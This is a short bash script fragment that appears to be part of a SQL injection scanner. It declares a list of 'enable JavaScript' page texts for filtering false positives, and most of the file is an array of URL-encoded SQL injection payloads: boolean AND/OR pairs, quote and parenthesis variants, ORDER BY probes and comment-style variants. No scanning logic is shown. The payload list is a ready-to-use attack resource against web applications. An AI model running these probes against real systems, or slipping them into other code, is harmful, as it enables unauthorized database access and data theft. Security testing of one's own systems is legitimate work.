#!/bin/bash
declare -a falsePositiveResponse=(
    "You need to enable JavaScript to run this app"
    "Please enable JavaScript"
    "JavaScript is required"
    "enable javascript"
    "requires JavaScript"
    "This application requires JavaScript"
    "JavaScript must be enabled"
    "Please turn on JavaScript"
)

declare -a payloads=(
  # Standard boolean injections
  "1%20AND%201=1--%20-"
  "1%20AND%202=1--%20-"
  "1%20OR%201=1--%20-"
  "1%20OR%201=2--%20-"
  
  # Quoted boolean injections
  "'1%20AND%201=1--%20-"
  "'1%20AND%202=1--%20-"
  "'1%20OR%201=1--%20-"
  "'1%20OR%201=2--%20-"
  
  # Double quoted boolean injections
  "\"%20AND%201=1--%20-"
  "\"%20AND%202=1--%20-"
  "\"%20OR%201=1--%20-"
  "\"%20OR%201=2--%20-"
  
  # Parentheses variations
  "(1)%20AND%201=1--%20-"
  "(1)%20AND%202=1--%20-"
  "1)%20AND%201=1--%20-"
  "1)%20AND%202=1--%20-"
  
  # ORDER BY injections
  "%20order%20by%201--%20-"
  "%20order%20by%2010--%20-"
  "'%20order%20by%201--%20-"
  "'%20order%20by%2010--%20-"
  "\"%20order%20by%201--%20-"
  "\"%20order%20by%2010--%20-"
  
  # Different comment styles
  "1%20AND%201=1%23"
  "1%20AND%202=1%23"
  "1%20AND%201=1/*comment*/--"
  "1%20AND%202=1/*comment*/--"
)